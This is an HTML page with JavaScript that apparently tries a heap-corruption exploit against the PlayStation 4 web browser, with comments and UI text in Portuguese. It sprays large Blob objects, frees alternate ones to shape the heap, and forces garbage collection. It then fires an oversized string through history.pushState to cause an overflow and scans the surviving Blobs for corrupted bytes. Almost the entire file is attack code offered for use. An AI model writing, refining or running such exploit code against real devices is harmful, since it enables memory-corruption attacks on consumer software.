<!DOCTYPE html>
<html>
<head>
    <title>PS4 Blob Corruption Attack</title>
    <style>
        body { background-color: #000; color: #ff00ff; font-family: monospace; padding: 20px; }
        button { font-size: 20px; padding: 15px; width: 100%; border: 2px solid #ff00ff; background: #222; color: #fff; cursor: pointer; }
        #log { border: 1px solid #333; height: 300px; overflow-y: scroll; padding: 10px; color: cyan; }
    </style>
</head>
<body>

    <h1>Estratégia: Blob Spray</h1>
    <p>Tentando corromper dados binários (Blobs) no Large Heap.</p>

    <button onclick="startBlobAttack()">INICIAR ATAQUE BLOB</button>
    <div id="log">Pronto.</div>

    <script>
        const BASE_OFFSET = 709522;
        const OVERFLOW_AMT = 1024 * 64; 
        
        // Tamanho do Blob (Tenta alinhar com o Bucket de 1MB)
        const BLOB_SIZE = 1024 * 1024; 
        const SPRAY_COUNT = 200; // Blobs consomem muita RAM, cuidado

        var victims = [];

        function log(msg) {
            const el = document.getElementById('log');
            el.innerHTML += `<div>${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startBlobAttack() {
            log("1. Gerando " + SPRAY_COUNT + " Blobs...");
            
            // Cria um ArrayBuffer base cheio de 'B' (0x42)
            let buffer = new Uint8Array(BLOB_SIZE);
            buffer.fill(0x42); 

            victims = [];

            // SPRAY
            for(let i=0; i<SPRAY_COUNT; i++) {
                // Cria o Blob a partir do buffer
                let blob = new Blob([buffer], {type: "application/octet-stream"});
                victims.push(blob);
            }

            // FENG SHUI (Buracos)
            log("2. Abrindo buracos...");
            for(let i=0; i<SPRAY_COUNT; i+=2) {
                victims[i] = null; // Libera referência
            }
            
            // Força GC
            await forceGC();

            log("3. Disparando Overflow...");
            
            // Payload
            let pwnStr = "A".repeat(BASE_OFFSET) + "\x01".repeat(OVERFLOW_AMT);
            history.pushState({}, "blob_pwn", "/" + pwnStr);

            log("4. Lendo Blobs de volta (Isso pode demorar)...");
            checkBlobs();
        }

        async function checkBlobs() {
            let found = false;
            
            for(let i=1; i<victims.length; i+=2) {
                let blob = victims[i];
                if(!blob) continue;

                // Precisamos ler o conteúdo do Blob para ver se mudou
                try {
                    let content = await readBlob(blob);
                    
                    // Verifica o começo e o fim
                    // Se encontrar o byte 1 (0x01) em vez de 66 (0x42 'B'), BINGO
                    if (content[0] === 1 || content[100] === 1) {
                        log(`<h2 style='color:#0f0'>!!! SUCESSO !!! Blob ${i} CORROMPIDO</h2>`);
                        alert("BLOB CORRUPTED!");
                        found = true;
                        break;
                    }
                } catch(e) {
                    log("Erro ao ler blob " + i);
                }
            }
            if(!found) log("Nenhum Blob corrompido.");
        }

        function readBlob(blob) {
            return new Promise((resolve, reject) => {
                let reader = new FileReader();
                reader.onload = () => {
                    resolve(new Uint8Array(reader.result));
                };
                reader.onerror = reject;
                // Lê apenas os primeiros bytes para ser rápido
                reader.readAsArrayBuffer(blob.slice(0, 1024)); 
            });
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 500));
        }
    </script>
</body>
</html>
